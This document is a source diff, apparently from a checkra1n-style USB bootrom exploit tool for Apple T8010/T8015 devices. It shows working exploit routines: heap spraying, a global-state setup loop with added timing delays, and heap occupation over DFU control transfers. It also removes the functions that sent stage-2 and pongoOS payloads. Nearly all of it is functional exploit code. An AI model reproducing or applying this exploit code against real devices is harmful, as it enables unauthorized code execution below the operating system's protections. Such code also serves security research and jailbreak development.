@@ -1,8 +1,9 @@
 
 #include <iousb.h>
+#include <checkra1n_common.h>
 
-unsigned char blank[2048]; // 00000000...
-unsigned char AAAA[2048];  // 41414141...
+static unsigned char blank[2048]; // 00000000...
+static unsigned char AAAA[2048];  // 41414141...
 
 // log
 static int empty(void){
@@ -15,9 +16,9 @@ static int empty(void){
 #define DEBUG_(...) empty()
 #endif
 
-void heap_spray(io_client_t client){
+static void heap_spray(io_client_t client){
     IOReturn r;
-    r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);;
+    r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
     usleep(1000);
     
 #ifndef IPHONEOS_ARM
@@ -52,7 +53,7 @@ void heap_spray(io_client_t client){
     
 }
 
-void set_global_state(io_client_t client){
+static void set_global_state(io_client_t client){
     IOReturn r;
     unsigned int val;
     unsigned int sent;
@@ -69,7 +70,9 @@ void set_global_state(io_client_t client){
     while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0)) >= val){
         i++;
         DEBUG_("%x\n", i);
+        usleep(10000);
         r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
+        usleep(10000);
     }
     
     val += 0x40;
@@ -84,7 +87,7 @@ void set_global_state(io_client_t client){
     
 }
 
-void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
+static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
     IOReturn r;
     
     r = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
@@ -105,74 +108,6 @@ void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payl
     r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
     
 }
-
-void payload_stage2(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
-    IOReturn r;
-    {
-        size_t len = 0;
-        size_t size;
-        size_t sent;
-        while(len < payload.stage2_len) {
-            size = ((payload.stage2_len - len) > 0x800) ? 0x800 : (payload.stage2_len - len);
-            sent = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, (unsigned char*)&payload.stage2[len], size, 100);
-            len += size;
-        }
-    }
-    usleep(1000);
-    
-    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
-    usleep(1000);
-    
-}
-
-void pongo(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
-    IOReturn r;
-    
-    //r = usb_ctrl_transfer(client, 0x40, 64, 0x03e8, 0x01f4, NULL, 0); // ?
-    
-    {
-        size_t len = 0;
-        size_t size;
-        size_t sent;
-        while(len < payload.pongoOS_len) {
-            size = ((payload.pongoOS_len - len) > 0x800) ? 0x800 : (payload.pongoOS_len - len);
-            sent = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, (unsigned char*)&payload.pongoOS[len], size);
-            len += size;
-        }
-    }
-    
-    r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, NULL, 0);
-    r = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 8);
-    r = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 8);
-    r = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 8);
-    
-}
-
-int connect_to_stage2(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
-    
-    LOG_DEBUG("reconnect");
-    io_reset(client);
-    io_close(client);
-    client = NULL;
-    sleep(5);
-    get_device_stage2(&client, 15);
-    if(!client) {
-        LOG_ERROR("ERROR: Failed to connect to checkra1n DFU");
-        return -1;
-    }
-    
-    LOG_DONE("[checkra1n] connected to Stage2");
-    
-    LOG_DEBUG("[checkra1n] sending pongoOS");
-    pongo(client, cpid, payload);
-    
-    io_reset(client);
-    io_close(client);
-    
-    LOG_DONE("[checkra1n] BOOTED");
-    return 0;
-}
-
 
 int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
     int r;
